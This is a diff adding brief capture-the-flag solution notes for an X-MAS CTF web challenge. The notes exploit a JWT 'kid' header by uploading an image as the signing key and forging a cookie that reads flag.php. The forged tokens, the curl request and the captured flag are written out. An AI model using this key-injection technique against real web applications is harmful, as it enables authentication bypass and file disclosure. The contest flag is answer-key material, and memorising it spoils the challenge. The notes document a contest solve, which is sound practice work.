@@ -1,0 +1,36 @@
+http://challs.xmas.htsp.ro:3010/b/
+	Can upload image
+
+eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6IlwvdG1wXC9qd3Qua2V5In0.eyJiYW5uZXIiOiJiYW5uZXJcLzE0LnBuZyJ9.Zi5h9r7Km7eJ8eBZtTGawS7uqwTkQbjcHs5y98lpWHY
+
+{
+  "typ": "JWT",
+  "alg": "HS256",
+  "kid": "/tmp/jwt.key"
+}
+
+{
+  "banner": "banner/14.png"
+}
+
+
+Upload key.png
+	b/src/1608522282261.png
+
+Change cookie to
+
+{
+  "typ": "JWT",
+  "alg": "HS256",
+  "kid": "b/src/1608522282261.png"
+}
+
+{
+  "banner": "flag.php"
+}
+
+python3 create_cookie.py
+	eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6ImIvc3JjLzE2MDg1MjIyODIyNjEucG5nIn0.eyJiYW5uZXIiOiJmbGFnLnBocCJ9.5tnPaSCP1fIjMc13VkyD5A25FNkqoRvI_f7kVPPpBLA
+
+curl 'http://challs.xmas.htsp.ro:3010/getbanner.php' -b 'banner=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6ImIvc3JjLzE2MDg1MjIyODIyNjEucG5nIn0.eyJiYW5uZXIiOiJmbGFnLnBocCJ9.5tnPaSCP1fIjMc13VkyD5A25FNkqoRvI_f7kVPPpBLA'
+	X-MAS{n3v3r_trust_y0ur_us3rs_k1ds-b72dcf5a49498400}
